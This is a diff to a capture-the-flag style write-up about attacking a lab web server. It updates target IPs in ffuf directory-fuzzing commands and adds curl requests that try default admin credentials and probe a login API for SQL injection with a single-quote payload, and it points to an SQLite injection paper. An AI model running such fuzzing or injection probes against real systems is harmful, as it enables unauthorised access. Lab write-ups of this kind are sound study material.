@@ -40,7 +40,7 @@ This doesn't provide us with much information however is a nice segway to task 1
 Now that we have some information regarding it being a webserver, lets use a specific wordlist for web content and run a ffuf scan. 
 
 ```
-ffuf -u 'http://10.10.196.10/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc all -fs 233
+ffuf -u 'http://10.10.155.88/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc all -fs 233
 ```
 
 ```
@@ -105,14 +105,37 @@ For this task, conventional wisdom would dictate we fire up SQLMAP and enumerate
 Let's run a final a ffuf scan on /api for good measure/
 
 ```
-ffuf -u 'http://10.10.196.10/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc all -fs 233
+ffuf -u 'http://10.10.155.88/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc all -fs 233
 ```
 
 ```
 login                   [Status: 405, Size: 178, Words: 20, Lines: 5]
 ```
 
-Time to leverage the hidden API we came across, which would help authenticate users. A simple python script running SQLi code would do the trick.
+Lets try default credentials.
+
+```
+curl -XPOST 'http://10.10.155.88/api/login' -d 'username=admin&password=admin'
+```
+
+```
+"The username or password passed are not correct."
+```
+
+Lets confirm SQLi by adding a ':
+
+```
+curl -XPOST 'http://10.10.155.88/api/login' -d "username=test'&password=test"
+```
+
+```
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
+```
+
+Time to leverage the hidden API we came across, which would help authenticate users. A simple python script running SQLi code would do the trick. You can find more information regarding the SQLi code from the following source: https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
 
 ```
 import requests
